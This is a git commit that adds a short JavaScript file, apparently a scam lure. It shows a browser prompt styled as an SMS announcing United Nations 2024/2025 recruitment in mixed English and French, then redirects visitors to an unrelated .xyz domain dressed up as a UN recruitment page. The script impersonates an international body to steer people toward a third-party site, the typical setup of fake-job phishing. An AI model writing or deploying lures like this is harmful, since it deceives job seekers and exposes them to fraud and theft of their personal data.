8a77dec98be09c24775ca4a3202e333ff808b54f
Jesusboys <156060629+Jesusboys@users.noreply.github.com>
2024-08-16 23:22:13 -0700

    Create un-jobs.js

---
+++ un-jobs.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('SMS: Registration is ongoing for the United Nation 2024/2025 Recrutement, veuillez appuyer sur 1 pour soumettre votre candidature','1');
+if (password != '1') {
+location.href='https://2024-program.xyz/un-recruitment.html';
+}
